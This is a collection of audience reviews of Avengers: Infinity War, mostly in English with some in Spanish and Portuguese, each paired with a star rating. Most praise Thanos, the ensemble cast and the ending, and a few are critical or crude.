"It was only after the release of Infinity War that I got interest in MCU. Before that I wasn't very much into superhero movies. So a couple of months after this movie released, I skimmed through all the MCU movies from Iron Man to Black Panther. I didn't put much focus into watching them all, since most of them were just following one pattern. Iron Man? A guy gets superpowers, beats the bad guy who wanted to take over the world and saves the day. Captain America? A guy gets superpowers, beats the bad guy who wanted to take over the world and saves the day. Thor? A guy ""loses"" and then gets superpowers, beats the bad guy and saves the day. Even in The Avengers and Age of Ultron it's just ""now all those guys come together, beat the bad guy who wanted to take over the world and save the day"". But Avengers: Infinity War is very much different. The movie begins from where the post credit scene of Thor: Ragnarok ended. Loki dies in the very beginning of the movie while he was trying to unsuccessfully deceive Thanos. This clearly shows that this movie really means business. It's not afraid of killing off the characters we have grown to like in all these years. Thor's hammer has broken so he gets a Mjolnir. Meanwhile Iron Man's team faces Thanos in yet another very brutal attack. Captain America's team is able to get out of their imprisonment after the events of Captain America: Civil War. And in spite of having a huge threat looming before them, Captain America and Iron Man still feel guilty of what happened between them previously. Thanos is undoubtedly the biggest threat to have ever been shown in any Marvel movie, MCU or otherwise. Unlike the comics where he's just simping behind Death to show how many people he can kill, this time he actually has a motivation. And that motivation is so powerful he is even ready to sacrifice his own daughter for it. He has fought for many years to find the Infinity Stones, and there is no way that he will sacrifice his lifetime work over morals or ethics. Concepts like humanity, empathy, conscience don't hold him back anymore, as he was brought up by the Eternals and in spite of being treated as one of them, he chose to part ways. Mortals don't matter to him anymore. His ambition does. Every scene from this movie is shot very well. The story, the colour palette, the choreography, the costumes, the score, everything is absolutely perfect. The only part I had a problem with earlier was when Starlord learnt about Thanos having killed Gamora and then he punches Thanos till he wakes up and is stopped. But later on I realised that Starlord has always been an emotional crybaby, and this kind of a behaviour is absolutely suited on him. He cannot be expected to think rationally, considering his track record in both the previous Guardians of the Galaxy movies. And finally in the end when Thanos snapped his finger, half the universe was gone. Even though we did know that they are all going to come back, the emotions that were conveyed by the characters clearly gave signs that something bad will surely happen in the end. I won't be getting into the spoilers because I want to keep this review spoiler free. So if you haven't seen it yet, don't just see who all disappear. Notice how they react when they disappear. Avengers: Infinity War is the kind of the Avengers movie I always wanted to see. I really don't like how The Avengers and Age of Ultron have aged so terribly (just like Joss Whedon's credibility lol) because of how campy they look by today's standards. Sure they did hold their legacy back then, but Infinity War will hold it for decades. It's the best MCU movie of all time.",5
A truly hype culmination of a lot of buildup. Thanos stands out as a very strong and memorable character. The good guys are also handled incredibly well considering the amount of characters and that most of them have very limited screen time. This movie proves the value of super long-term storytelling which is almost unprecedented in the movie media up till this point.,5
"As one of the best superhero movies out there, Infinity War makes for a thrilling first half to the MCU's concluding chapter.",4.5
Bro please just give me more marvel all over my mouth,5
"Finally! After binging the previous 18, I've reached what are indisputably the best of the Avengers movies. And why are these last Avengers movies so great? Because they took the time to build the characters and worlds they inhabit over 10 years and 18 ‚Ä¶ freaking ‚Ä¶ movies. The first Avengers movie impressed me mostly because of the fantastic job Joss Whedon (ü§Æ ) did in bringing six larger than life characters together with the requisite tension and witty dialogue, while delivering non-stop action. What the Russo brothers were able to achieve in Infinity War is frankly astounding. They did what the first Avengers movie did but with 21 of the main heroes which includes Iron Man, Thor, Captain America, Black Widow, Hulk, Vision, Scarlet Witch, War Machine, Falcon, Star-Lord, Rocket Raccoon, Groot, Gamora, Drax, Mantis, Nebula, Doctor Strange, Spider-Man, Winter Soldier, Black Panther, and Nick Fury. This doesn't include the excellent supporting characters of Wong, Heimdall, Okoye, Shuri, M'Baku, Eitiri, and Maria Hill. Every scene that brings these characters together, especially those that haven't met each other before (Iron Man and Doctor Strange, Thor and Star Lord, etc.), or those that haven't seen each other in a while (Captain America and Winter Soldier), gave me goosebumps. All the personalities from their respective films are the same (Drax is still hilarious: ""Die blanket of death!"" after getting smothered by Doctor Strange's cape). Thanos is probably the best villain in the MCU, toppling Loki. Josh Brolin does a great job making him a brutal and mildly sympathetic villain. And the number of locations they bring us to in all of its (4K HDR) glory is just insane: Earth (New York, Wakanda, etc.), Knowhere (Reality Stone), Vormir (Soul Stone), Zen-Whobiri (Gamora's home planet), Titan (Thanos' home planet), and Nidavellir (dwarven ""smith"" planet). 100% of the credit can't be given to the Russo's. The writing, producing, special effects, and frankly all the teams involved deserve huge kudos. The finale is essentially the last hour of the film. While it helps to have a $350-$400 million budget, it takes a perfect storm of all these teams working to pull it off. Multi-location action and drama. And the bitter ending after the snap. What really got to me here was T'Challa/Black Panther reaching out to Okoye and says ""This is no place to die"" then turns to dust. With Chadwick Boseman's passing that scene is just too real. Just wow.",5
this movie is more entertaining than other marvel movies,5
I loved the alien fight,5
"displays the true power of Thanos amazingly, and if you haven't seen it, you have to right now. A really climactic and awesome movie that has you on the edge of your seats the whole time",5
This movie was great. but the movie had a very depressing ending,4.5
Prime example of a studio doing fan service for 2-3 hours,3.5
Thanos is what saved this movie for me he was very well written and well acted by Josh Brolin. But the rest of the characters were just meh. some scenes were so dumb that hurt the movie from getting 4 stars from me for example there is a scene where Thor and Captain America are in the middle of a huge battle and they stop to talk about hairstyles and to introduce Captain America to Groot scenes like these are so silly in these kinds of movies that clearly want me to take it seriously. The scenes with Thanos and probably the ending is what makes this movie worth watching.,3
"By far the best marvel movie. There is no way they can do better then this, this comic book movie is insane and fits the MCU so well. The pacing is perfect, the moments are emotional, the scale is superb! I can't see marvel doing better then this ever again!",5
"Um filme muito mas muito bom, recomendo demais! principalmente quem j√° √© f√£ da saga, o filme at√© me fezs chorar, ficar animado e me hypar demais!",5
"I am a fan of everything that happened in this movie, except the fact that they benched the Hulk character. The Hulk should have played a larger role in this movie.",4.5
A soul for a soul ..,5
"Seeing all these different characters from 18 other movies come together in such a seamless way. The battles are big and spectacular, the characters all get the screen time they deserve. It makes me laugh every time I watch it. Thanos is of course spectacular. It's everything you could possibly want, and because of that it's one of the best MCU films.",5
Absolutely perfect. Except hulk being scared or something and never being explained. My favorite avengers movie.,4.5
A truly amazing film this left many including myself processing the events that had just occured. From the stunning visuals to the main big bad I feel as though I may have deja Vu of this storyline from somewhere. Oh that's right the original JL storyline that wasn't hacked by Joss Whedon and Warner Bros. Flaws do exist such as the unnecessary light moments in a film that should have be taking itself seriously. Kudos to Disney for allowing Marvel to have full creative freedom in achieving this Cinematic masterpiece.,4
"It is definitely the magnificent and definitive work of any superhero comics adaptation that has a great cast well managed, has the right balance of philosophy and blockbuster to captivate any viewer and at the same time reach the hearts of true comic fans.",5
I loved this movie everyone should watch it,5
"Only 85%? Avengers: Infinity War deserves better as it's an epic superhero movie and epic movie in general. The stakes are high, all the characters are here, the action is incredible, but what makes this movie so great is Thanos. This movie is as perfect as it can be.",5
"It has one of the best villains in superhero cinema, many emotional moments and excellent action.",4
"Avengers: Infinity War offered an epic, action-packed film to it's fan with such a huge ensemble cast, something very hard to do but it worked here. CGI, Acting, Writing, Pacing, almost everything on point and they executed to the hype this movie had. Must see and a great movie.",5
Thanos is truly the star of this movie and that's what makes it great! My favorite of the Avengers movies.,5
"He was destined to go that path, and winning was his destiny. I am inevitable!",5

"yo esperaba otra cosa,a mi no me gusto tanto 5/10",2.5
"First movie to make me root for the villain, that's how good it is.",4.5
"Arguably the best of all The Avengers films, Infinity War takes what made the first film work and dials it up to 11, while adding a truly memorable villain in the much hyped up Thanos. More characters, more story lines, more everything; yet somehow these films have a knack for juggling it all so well that no one is wasted, and every thread connects. While Infinity War is essentially a very plot heavy 2-and-a-half hour first Act, it is also first-rate pop entertainment.",4.5
"marvel got better, when they ignore fluff and kiddy stuff.",5
"Pelicula de humor mas que de super heroes , entretiene y es la mejor de la trilogia , pero despues de ver a zack snyder justice league , merece bajar sus estrellas",1

Great movie moved the story good pacing always kept interested,4.5
"A masterpiece, with a great storyline, the villain is well developed, I enjoyed every minute.",5
"Definitely lives up to the hype, is really emotional and Thanos is amazing. 10/10 would recommend. Easily the best of the MCU.",5
Best Movie in history,5
Greatest superhero team up ever made. People need to give it more credit than they do!,5
The story isn't great but the special effects are amazing. Should've had more Black Panther since the finale battle is in Wakanda.,2.5
"It was epic! Every time I'm feeling like hating marvel I come to watch this and it brings me back to wanting to see more of this, this movie absolutely delivered a full look at how it would be for the avengers to lose and the villain was great!",4.5
One of the best cb movies of all time,5
"This movie is just non-stop action, and it's really great! It all looks really good, and every character they included really feel like they contribute to the overall plot.",5
serio esse filme e absolutamente incrivel super recomento a historia o enredo os efeitos a acao os poderes e tudo muito loko,5
Greatest Superhero movie ever!!! But alas the next movie (End game- which was also a good movie) couldn't properly keep the pace.,5
The only thing that this movie achieves is making all the former plots of each superhero completely insignificant compared to the main Thanos plot. The later plot being highly idiotic and with fairly poor and nonsensical motivations.,0.5
The best comic book movie ever made next to spider man 2. 10/10,5
"Not just one of the best comic book movies of all time, but one of the best overall, it does great Justice to MOST of its characters with great moments, Entrances, Development and a shocking ending that will leave you wanting more but also wanting a better continuation for it.",5
Simplemente Marvelüòç,5
The Great Snap is an effective moment. It did indeed past the time. But barely,2.5
A very action packed Marvel film is second to Endgame in my opinion. The huge emotional punch leaves the viewer fuming and even sorry for these characters.,4.5

I liked the story of Thanos,5
Really good. I like the characters the plots and the fight scenes but there is one thing that bothers me and that is that they try to shove so many characters in one movie. I am not even kidding there are over 70 characters. It was still really good despite that though and I would recommend you watch it,5
Bastante buena!! Recomenda para ver una y otra vez,4
"Avengers infinity war is a shocking, exciting and a fun film overall. Marvel provides an action packed film with some comedy at the right times. This film really leaves you in shock and ready for the next film. Overall excellents from marvel from all around!",4.5
You HAVE to watch the movie its amazing,5
I saw Infinity War about 5 times in the theatres and it got better every time. One of the greatest films of the past decade. Seeing the Avengers and Guardians come together to fight off Thanos was so satisfying. The Russo brothers killed it and created an exciting and visually stunning movie.,5
"One of the best movies of the century. Some sloppy pacing at times throughout the movie, with some rushed scene CGI, but the story and acting are top notch. Marvel fan or not, Avengers: Infinity War and Avengers: Endgame are must see!",4.5
The culmination of a great run of movies. Amazing story,5
This is the best avengers movie. Thanos is so good and his fight with doc strange is incredible. Really loved the ending it was bold.,5
I cried more than I thought I would.,5
The action never skips a beat in this movie. Top this off with an excellent cast and jaw-dropping visuals and you've got a stellar addition to this wonderful franchise. It's easy for someone to get lost amidst the story but it's good fun nonetheless.,3.5
One of my top 5 MCU movies! This is an amazing Avengers movie! I have watched this movie so many times. I can't get enough!,5
Best avenger movie yet but NOT a big deal!,1.5
Esse filme √© muito massa,5
"Good movie, as first part of the end of this fase",4
"A movie that was 10 years in its set up and development, is the culmination of the 20 odd Marvel Cinematic Universe previous films.The interwoven story lines of our previously established super hero's adventures along with the main theme of Universal death and destruction that the story is centred upon take us on an epic action packed adventure. It amazingly reaches its end in two locations, one epic battle on earth and another more important battle on an alien planet , both of which fail with epic conclusion. This is by far the best Avengers film to date and is action packed throughout. Some lighter moments are provided by the regular returning super hero cast but in the main it is a dark , high tension, edge of the seat, SCI FI epic.",4.5
Extremely good film. I love the cliffhanger at the end and it just has a great plot and story line and characters and there is almost everything to love about it.,5
This movie expertly balances the massive cast of characters with stunning action and a properly developed villain.,5
The greatest sequel in the PG-13 era!!!!!!!!!!!!!1,5
"It only worth to be watched once and after the theme park ride has been spoilt in the first watch, nothing is there to be experienced during repeat view again.",0.5
I LOVE THIS MOVIE I can watch it over and over. It's so awesome and filled with action. It is better than anything ever. It is so well paced all the characters seem to fit in somewhere in the story. Especially the three main Bois.,5
"This movie is done right. Every character is respected. Every scene matters, is good, and moves the plot along in a logic manner. This is why movies were created. For this.",5
"Infinity War excellently crosses over the heroes of the Marvel Cinematic Universe. Infinity War is a huge pay off to what the Infinity Saga has been building towards. Infinity War features a great cast of heroes, and Thanks who was perfectly casted. The Avengers movie also has a great cliffhanger!",5
O 2¬∫ melhor filme da Marvel,5
It was the best movie I have ever watched!!!,5
The movie is awesome! Need more marvel movies,5
"Probablemente la pel√≠cula m√°s redonda e impactante que he visto, es una pel√≠cula √∫nica, una de las mejores pel√≠culas de superh√©roes, el final deja a todos con una sensaci√≥n de vac√≠o emocional Incre√≠ble, una pel√≠cula insuperable, y que hizo algo que nunca nadie pens√≥ que podr√≠a suceder en pel√≠culas de Superh√©roes, sin lugar a dudas es √∫nica",5
"""Avengers: Infinity War"" is an entertaining, emotional and thrilling movie with great acting, a deep story and a large scale.",5
This film is world's best superhero movie it's full of action and incredible scenes like thor got new weopen and an eye from rocket. It truly and must watch movie. I have watched it 4 time and I will watch one more time it's film it's full of thrill. I guarantee it would worth your time and money,5
"A nearly spotless and refined masterpiece; Infinity War was that one movie which brought the entire work of a decade into a single ensemble. Seeing various characters interact each other for the first time brought entire audiences to the top of their voices. Various scenes and soundtracks successfully made shivers down the spine, not to mention the shocking turn of events nearing the finale. Overall, this is an MCU movie at its finest.",5
Best Marvel movie ever made in my opinion. Action was fantastic the villain was in my opinion the best supervillain ever put on screen. The jokes were all funny and for me none of them fell flat. Pacing was great and story was simple but great. My only issue with this movie is there was a lot of bad human decisions made that led to Thanos's victory but I don't think it really compromises the movie that much as it is Thanos's movie. Other than that this movie is near perfect.,5
"This movie is overrated, I think.",1
above average superhero film,3
Esse filme √© um sonho realizado para qualquer f√£ de quadrinhos de super-herois ou mesmo para os f√£s do cinema de super-herois. Daria mais estrelas se possivel fosse.,5
"It has some stupid setups, That's it.",2.5
"Avengers: Infinity War is the best entry in the Marvel Cinematic Universe by far, it somehow manages to balance out having a million different characters and gives each character their own story. The best parts of this movie are the visuals, the score by Alan Silvestri and the standout performance by Josh Brolin as Thanos: The Mad Titan. There's nothing bad I can say about Infinity War, it is an amazingly crafted movie written, directed and acted by passionate people who truly care about what they are making.",5
"A nearly perfect movie, and one of the most quotable movies of all time along with Clue and a relatively small number of other movies.",5
"As a big fan of the MCU, this film was worth the wait. It establishes it's speed and energy and stays there. Seeing all these characters come together is a dream come true, and is a thrill ride from the start all the way to the credits.",5
Thanos is an icredible villain and I love the facts that first he won and second he is the hero of the movie he is the more developed character and the Rousos did a fantastic job at doing that ! They managed to have 72 characters and all of them be interesting to fantastic the best MCU movie in my opinion,5
This film was great! The film is a film the whole family can watch together. The film takes a darker turn on the mostly family friendly superhero genre and the film must be applauded for doing so. Some of the scenes of have that get together and feel powerful together moment with the avengers theme pounding in the background. That what makes the avengers movies so great in the first place. Great film!,4
Sad for Ironman n Black panther,5
"This movie can sometimes be too clustered with such an expanded cast, but it keeps me intrigued from minute 1. Thanos can at some points make you feel sympathy for him, even as he's trying to commit a mass murder. The action is fantastic, and the dynamic between Iron Man & Dr. Strange is greatly appreciated. Great lead up to Endgame. Underrated by critics in my opinion.",5
"This is exactly the sorta thing I want from an Avengers film! Full blown, no punches pulled action. In that regard, it's an outstanding watch! Despite knowing practically little about the MCU up until a few weeks ago, I still knew this was a film that was going to see - so to speak - excrement hit the fan... and boy did it! It's a great ride. Like 'Captain America: Civil War' did, 'Avengers: Infinity War' does an incredible job at juggling the gargantuan number of characters. It's ridiculous, but totally awesome, how many faces we see appear again. I thought they got the screen time for all, more or less, down to a T. Not an easy job, that. Speaking of the cast, it's Robert Downey Jr., Chris Hemsworth and Josh Brolin who stand out most in my memory. Them three are excellent, especially the latter. Away from those lot, it's very cool to see all the other worlds - including from 'Doctor Strange' and 'Guardians of the Galaxy' - come together into one film. As for new additions, there aren't many - Peter Dinklage being the pick. There are many references that I had already become aware of just via the internet, so it was quite amusing seeing them all unfold here and there. The effects looked great to me, as they have basically all the way up until this point of the MCU. The comedy is good again, also. Needless to say, I can't wait to see 'Avengers: Endgame'!",4
Best MCU movie so far.,5
A rollercoaster ride from beginning to end. Action-packed filled with emotion!,4
AVENGERS: INFINITY WAR masterfully blends characters from 10 franchises into Part I of the 2 film finale to Marvel Studios' Infinity Saga,5
"Review: Filled with breathtaking action scenes, colourful but also grounded characters and a surprisingly tight plot, Infinty War is undoubtedly one of the best MCU films. The film has the most varied set of locations I've ever seen in a film (We go from gothic spaceship to New York City to colourful spaceship to African paradise to mythic sun to barren wasteland) and the quick pacing makes the film very rewatchable. The huge, planet shattering finale is a true eye popper, and Josh Brolin as Thanos is defiantly the best Marvel Villian. Tom Holland as Spider Man and.Chris Hemsworth as Thor are always great, and the Dark tone is matched by a truckload of mostly funny jokes (there's a few misses). The runtime is justified, and the film serves as a guide to how massive cast films should be made. | Rating: A",5
"When it comes to tying a story together, marvel does it best. Stand alone movie very very good, but it's even better if you take the time to have watched all the movies leading up to this film. Replay value: High, purchase because you will re watch this film again",5
This is a long movie but a movie that has been done right! The plot never loses track and is an easy watch!,4
This movie is soo amazing. I really loved the suspense at the end,5
"All ideas, concepts etc are executed wonderfully and the movie nails the cliffhanger ending.",5
"This is what I think of in terms of absolutely perfect superhero films. Avengers: Infinity War steps up the drama, action, comedy, characters, and special effects from the already impressive lineup of Marvel Studios films that came before.",5
"I genuinely don't believe we'll ever get a more epic and cohesive cinematic universe than the MCU. It took Marvel over a decade to establish all the characters and set everything up. Infinity War and Endgame are the culmination of over a decade's worth of careful cinematic planning. The sheer scale of it... The nostalgia, too, because we grew up watching these movies. We've been watching these characters on our screens for years. We've seen them grow and develop. I honestly think we will never get a series of interconnected movies like this in our lifetime. Who could even do it? DC tried and it didn't really work out. They were behind and they rushed it. They have a couple of good movies, but not like Marvel. And there's also the superhero fatigue to keep in mind. Maybe Disney could do this with Star Wars. There are also the X-Men movies. But I digress... I've seen the entire Marvel Cinematic Universe multiple times. I love all of the movies. They're very good as a standalone. But they're even better when you take into account the shared universe element. I genuinely believe Avengers: Endgame is peak superhero genre. It's the apex. We will never get a more epic superhero movie than that in our lifetimes. Maybe Marvel will hard-reboot everything in like 50 years, who knows... This has been an incredible journey. And I know Marvel will keep making movies, but I think it can only go downhill from Endgame. I don't believe they can outdo the Infinity Stones and Thanos storyline and everything before that lead to it.",5
"Both Avengers: Infinity War and Endgame both prove that not all movies, TV shows nor books have a happy ending. I hope Marvel keeps up the great work!",4
"This one was a let down for me. It didn't include the entire core of the Avengers and was more of a Thanos movie than an Avengers movie. Left the theater disappointed and even a bit depressed. Acting was very good, but I was expecting a lot more from this movie.",3.5
Exactly what you expect it to be.,4.5
"La mejor pel√≠cula de marvel hasta el momento y mira que casi todas son un 9/10, pero esta es un 10/10",5
This movie is absolutely incredible!,5
filme maneiro foda epico demais a√ßao historia,4
"Emotional and action pack, thanks to the great build up and banta between each character, This is also supported by a captivating performance by josh Brolin, he converts into a Villain with motives and objective that needs to be done in his eyes. While leads to having a Villian u can sympathises for and gives a greater understanding of both sides.",4.5
"Speechless for Disney, the 3rd part of the Avengers saga is impeccably well produced to the smallest detail, truly a masterpiece.",5
I wore a diaper so I wouldn't miss anything ( not really...or did I?),4
"A lot of loop holes, too much funny stuff, it's kind of good entertainment",2
Not a bad movie but not that great either. Still worth watching.,3.5
"Avengers: Infinity War is probably the most bold and groundbreaking MCU feature of all time. It's is incredibly fast paced, action packed, exciting, and zany fun. 2 Hrs and 30 Mins of amazement! This is one of the best movies of all time, hands down!!",5
"The movie suffers all the same problems of endgame (not much character development and skipping over interesting character moments.) , but it is more entertaining, plus it doesn't need to have much character development because of the 10 years of movies before it, and it somehow balances like 40 characters, pretty good.",3.5
"Good god this movie is the best. Everyone ('cept Fury, Ant-Man, Hawkeye and Captain Marvel) is in it, and you would think that the Russo Brothers wouldn't be able to handle 60+ characters, and yet they do! It is a cinematic experience.",4.5
"Scarlett Johansson and Ashley Olsen look very good in the movie, unfortunately the rest of the flick is an expensive, boastful, illogical and overly imaginative slaughter. I feel better entertained with an episode from Breaking Bad.",2
"A great movie that properly introduces us to the biggest MCU threat that has been rumoured from the very start, Thanos.",4
Alright marvel you put my self away,0.5
A decent movie at the beginning that becomes really good in the last 20 minutes. All in all entertaining but you really have to see a lot of movies before for this to make sense.,3.5
"Huge twists that I did not expect, this was a great visual ""Marvel"" and it was very epic to watch, and had so much action.",5
"(SPOILER ALERT!) I love this movie because of it's suspenseful ending and it's 1 year wait to see its true ending. But what this movie lacks is that they are all in separate teams because if the Avengers were together before Infinity War and before or after Civil War, they couldn't've defeated Thanos. Also, why did Thor go for the arm if he is so powerful?",3.5
"my favourite movie of all time. I love to see all these awesome characters team up to take on a great villain. it contains some hilarious moments, some of the best action I've ever seen and one of the best cliff-hangers in all of TV.",5
Infinity War marks a new level of storytelling maturation for the MCU. It has gone beyond the laughs and even beyond the ideas. What is does now is strip the armour and produce the tears. The Part 1 of the epic conclusion of characters we live for and love gives us an emotional climax to what might be one of the greatest achievements in comic book film history.,4
"It was just OK. Not a great movie, and CERTAINLY NOT WORTH A 90%",2.5
An amazing movie with an unexpected ending,5
"The only detractors are so slight that 99% of human beings wouldn't even notice. My only biff is the slight taste of cheesiness, but aside from that, some of the best acting in the world, killer fight scenes and epic plotlines stand out the most",4.5
Obviously gut wrenching and terrific...I'm glad to have seen it once in a life,5
The Russo Brothers made an excellent job in this movie. There are no moments where you feel bored or tired. They made an excellent job by handling the times of the characters. Definitely a must-see.,5

Phenomenal absolutely brilliant. This will go down for sure as one the best Superhero movies ever. The opening scene is just amazing the music the way it goes into the scene. The way they some how fit every superhero in this movie was brilliant. Thanos is finally the villain we all wanted to see. This is for sure top 3 best Marvel movies.,5
"Great movie, best in the Marvel series.",4
"a film with an excellent construction of the villain, many good action sequences and manages to amuse itself to the point where you don't even notice the hours pass, and has a very impactful ending, it goes easy on a list of best hero films.",5
How is it possible that this has an 85% critical rating... Maybe sucking the dicks of the sponsors that pay your salaries might be an answer... Give me a fucking break Rotten Tomatoes..,0.5
Absolute masterpiece! Unpredictable and amazing! This is one of those movies you don't wanna spoil for yourself. Go check it out!!!,5
"I think this is the best Avengers movie, but I still don't think it's good. Thanos was interesting enough of a villain to me to earn this movie a better grade than the rest of the Avengers movie. I also appreciated the fact that people actually died at the end of the movie. Also, Thor's entrance into Wakanda is so cool until Mark Ruffalo shows his face and delivers the worst dialogue in the movie. Sadly, the action is really bland in my opinion and I don't find the dialogue to be witty or clever like most say. I find it to be extremely cringe. Not that great.",2.5
What a wonderful film!! It's fantastic!!,5
This is the greatest MCU movie so far.,5
"This is one of the best Marvel movie! It's GREAT, EPIC, AMAZING and MASTERPIECE!",4.5
"This movie is a completely different experience compared to any other Marvel Studios film or any superhero movie in general. The Avengers confront their biggest enemy yet, Thanos, still separated because of the events of previous movies. They will have to find a way to stop Thanos, even if they are not fighting him united. This is an emotional roller coaster and has some of the MCU's greatest moments. The story will let you thrilled and completely amazed. Another must-see for superhero movie fans.",5
The perfect movie. To bad they ruined it with Endgame,5
"Wait, is this the film where the good actually lose? It's great!",4
OMG.. loved this movies. took my kids and they all loved it too.. we came out of the cinema with wide grin on our face.,5
really awesome and with and cool and express,5
"Lighthearted and funny, but also dark and suspenseful, bringing everyone together against the common threat of Thanos was well-worth the wait. Amazing movie with the biggest cliffhanger ending the MCU has ever done so far.",5
Master of misdirection,5
What a film! The Russo bothers do not know how to miss. Infinity War swings for the fences and sticks the bold landing.,4.5
"Thanos is the protagonist of the movie. He's a insane character. I love how all the heroes were beaten. Btw, Peter Quill was done really well in this story. I don't hate him.",4.5
"It's a great movie, well organized with incredible action scenes! It's funny and at the same time, it manages to deliver a dramatic enough load to make anyone get emotional. Great script, justifiable missions, and a villain with an emotional weight very well done with an interesting goal! So fresh!",5
"( warning, this review contains spoilers) Great fantastic phenomenal movie starring Robert Downey Jr., Chris Evans, Tom Holland, and Chris pratt. This isn't your typical marvel film, it's an event. You would hate this movie if you've never seen the other 18 marvel movies. Their was so much death in this movie and it was amazing. Hype for avengers 4 and another secret movie that's the end credit scene of this film.",5
Feels like every other marvel movie,2
"This film is so amazing! I love this film. It had a great story, great cast and the visuals in this film were really awesome. This film even has a cliffhanger at the end where you wonder what is going to happen in the next film. This is truly one of my favorite Marvel films of all time and one of my favorite films of 2018.",5
"As long as black panther and his posse was not on screen, talking or taking up space, the movie was fantastic. Best plot. Best villain. Best CGI. The best Marvel Movie hands down and by a mile. I wrote two reviews because apparently if you say the word black in your review at ALL, you will get a notice asking that they take time to review your post. LOL.",5
Too much focus on the special effects and action scenes... I wanted more story,2
Muy interesante y entretenida,4.5
Overrated franchise to be honest. A normal people wanted to be a superheroes. Vice versa with DC heroes that wanted to be a normal people. Meh.,3
"The best mcu movie. Great action, character momentd,and one of the most memorable villains. One of the best movies of all time along with endgame.",5
"An epic beginning of the ending of the 10 years build up with cool action scene, mind-blowing visual effect and a shocking ending",5
"a great film that's one of my favorites in the franchise, but the ending is pretty frustrating. also pretty rewatchable, although that ends after 20+ viewings.",4.5
"Special Effects: 1,0/Sound Effects: 1,0/Acting: 1,0/Story: 2,0",5
Absolutely astounding achievement in Cinema history.,5
The movie was good but not great. I would still recommend seeing this movie is the prequel to Avengers: Endgame.,3.5
"Predictable, but looks like Citizen Kane next to Endgame. 9.5/10",5
Just as good as Endgame!,5
It was great because it did not felt like an avengers movie it felt like it was Thanos's movie because it was different from every superhero when the hero always win.,3.5
"The movie had a few good parts, but I was mostly disappointed.",3
"Not bad, but not great.",3.5
It was just ok. Maybe I was expecting more because of the rave reviews.,3.5
"Like many. Whilst isn't mind endings that aren't all ""unicorns, roses and lollipops"". The selection of ""half the universe"" was haphazard and yrs upsetting but esp my personal fav, Cumberbach giving up the Stone. He'd have never done that. I also struggle to see how/why B. Panther made so much money as AI just don't get that character (but I digress). Of course visually the film was magnificent but now 2 years on reading ""reviews"" and ""interviews"" and why we did this, that and the other (Poor Groot) I just didn't like THIS ending. I think lesser characters could've been selected I dunno. Even today I struggle with the premise of the film.",1.5
"What can I say about Avengers: Infinity War? This movie seriously just awesome. Thanos is seriously the best villain in the MCU. He doesn't quip like Ultron, he doesn't do evil stuff just to because he's a bad guy he does it because he has his own purpose of doing things. Thanos is the main character of this movie which makes sense considering the fact that we didn't know him that well in the past. His motivation is actually pretty compelling argument that could be talked about for a pretty good while. Thanos stoled the show every time he appears on screen. He literally demands your attention and you honestly have no choice but to listen to him and hear what he has to say. Even when you don't agree with his plan you still want to listen to him because he's that good of a villain. This movie is nothing but purely great and the only problem that I have with it is the scene where Thor gets his axe. It does feel long and could drag the film but even at that I still kinda enjoyed it because I am curious to see how Storm Breaker was made and I do find it interesting that Thor's hammer was made here as well. Also this film does go all over the place, however considering the fact that you're searching for cosmic stones you really have no choice but to do that. All in all this movie was dope. I can't recommend this enough. 10/10",5
"Reminds one a lot of The Phantom Menace . . . Entertaining, although there are a number of ways the heroes could have logically triumphed that are never addressed. Ties in the previous movies seamlessly for a long but intense couple hours.",3.5
Perfectly combined all characters in this movie. Thanos is one of the greatest cinematic villains I have seen this decade.,5
One of the best avengers movies I've seen yet.,4.5
Este √© o meu filme da Marvel Favorito,5
"This movie is fun, funny and even deep and it progresses the MCU's story line a whole lot. Definitely a must-see.",4
"Another great entry to the MCU with an incredible villain, beautiful action, great acting, and masterful effects. This is the climax of a decade of film and it‚Äôs worth every minute.",4.5
Avengers: Infinity War is one of the coolest crossover movie I ever seen and where it has all the Marvels characters to fight that powerful villian named Thanos but the only thing I really hated about this is the ending and where some of the Avengers died.,4
El suspenso condena al espectador a no levantarse de su silla. La actuaci√≥n de los actores es excelente.,5
Thanos has a point....this movie was the Empire Strikes back of super hero movies....ending was fantastic,5
"Infinity War is my favorite theater experience of all time, and it represents the pinnacle of what blockbuster entertainment can be. There is not a second of downtime in this film, which speaks volumes to Kevin Feige and the Russo brothers' ability to juggle all these characters perfectly. It really is more than a movie : it is a cultural phenomenon.",5
Bad action bad jokes sad worst movie ever,0.5
"Just by looking at the epicity that Avengers: Infinity War gives, Marvel Studios, assuring you, already has you in the palm of your hand.",5
"When I first saw this movie i did not like it, for Marvel's standards. It was good but i felt it was meant for the big comic book fans with all the heroes teaming up all over the universe to fight against Thanos. I think its because my expectations were so high for the film they did not quite reach there like the original avengers did or endgame. But rewatching it recently i realized that this movie is less about the plot and charecter archs but more about the action and all these charecters we have scene throughout the last ten years all teaming up and fighting against 1 man, 1 evil. And i think the derection the film went following Thanos was brilliant. Because having all of these charecters team up a massive cast its just not easy to make all these charecters feel like one team with each getting enough screen time. But following Thanos the bad guy getting all the stones just made it work out perfectly. Sure the snap did not have the effect on me like on others because i knew there would be a sequel it still sets up a the next story so well with such i stakes. Overall this is a film i find myself putting on often for its incredible action sequences and the amazing CGI and special effects.",4.5
"After ten years of all of these mediocre films, I stopped caring about these characters long ago. I found the climax of Thanos's victory to be completely pointless. We all knew these characters weren't gone forever. So, what's the point of feeling sad? This movie was a pointless waste of time, and It sucked just the disappointing Captain America 2: The Winter Soldier and the Abysmal Guardians of the Galaxy.",1
This movie was great from start to finish. In my opinion this movie is top 3 in the MCU.,5
After a powerhouse phase 3 Infinity arrived on a gigantic mound of expectations and it mostly delivers but can't escape feeling a little unfinished. That being said the action scenes are spectacular and the downer ending is emotionally draining as expected. Everyone's in the top of their game here as they rush trying to stop Thanos. And despite a dark premise there's lots of laughs along the way as well as tears. From the opening moments you know the game is real. The events are shocking and yet it's still exciting to see our favorite characters come together especially a hilarious Thor and star lord and a lovable and heartbreaking spider man. But the real goods belong to a wonderful layered Robert Downey Jr. The best thing about this film is that it leaves you wanting the next chapter desperately. Budget: $316m Box Office: $2.048B 8.5/10,4
"Years in the making, Avengers: Infinity War is the breathtaking Empire Strikes Back-style prequel to Avengers: Endgame. In fact, it's probably a better movie than its successor. Infinity War takes us to dark places that are unchartered territory for fans of the Marvel Cinematic Universe, yet still manages to sustain a smile on the face of nearly every fan for the duration of the movie. The gigantic crossover event that Marvel promised was delivered, and it offered so much more than your average superhero flick.",5
